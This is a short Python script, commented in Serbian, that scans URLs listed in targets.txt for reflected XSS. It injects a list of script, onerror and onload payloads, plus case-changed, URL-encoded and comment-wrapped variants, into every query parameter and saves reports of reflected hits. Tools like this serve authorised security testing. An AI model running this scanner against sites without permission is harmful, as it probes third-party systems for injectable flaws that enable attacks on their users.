import requests
import re
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import os

# === Payload lista (XSS primeri) ===
payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<iframe src='javascript:alert(1)'></iframe>"
]

# === Lokacija rezultata ===
REPORTS_DIR = "reports_simple"
os.makedirs(REPORTS_DIR, exist_ok=True)

# === Provera refleksije ===
def is_reflected(response_text, payload):
    return payload in response_text

# === Jednostavan mutator ===
def mutate_payload(payload):
    return list(set([
        payload,
        payload.replace("alert", "prompt"),
        payload.replace("script", "ScRiPt"),
        payload.replace("<", "%3C").replace(">", "%3E"),
        f"<!--{payload}-->"
    ]))

# === Glavna funkcija za napad ===
def attack_url(url):
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    query = parse_qs(parsed.query)

    if not query:
        print(f"[!] Preskačem (nema parametara): {url}")
        return

    for param in query:
        for payload in payloads:
            for mp in mutate_payload(payload):
                test_params = {**query, param: mp}
                response = requests.get(base, params=test_params)
                if is_reflected(response.text, mp):
                    print(f"[HIT] {url} | param: {param}")
                    print(f"      Payload: {mp}")
                    save_report(url, param, mp, response.text)

# === Snimanje izveštaja ===
def save_report(url, param, payload, response_text):
    filename = f"{REPORTS_DIR}/hit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, "w") as f:
        f.write(f"Target: {url}\\n")
        f.write(f"Param: {param}\\n")
        f.write(f"Payload: {payload}\\n")
        f.write("\\n--- RESPONSE ---\\n")
        f.write(response_text[:3000])
    print(f"[+] Sačuvan izveštaj: {filename}")

# === Pokretanje sa targets.txt ===
def main():
    try:
        with open("targets.txt", "r") as f:
            targets = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[X] Nema targets.txt fajla.")
        return

    for url in targets:
        print(f"[>>>] Obrada mete: {url}")
        attack_url(url)

if __name__ == "__main__":
    main()
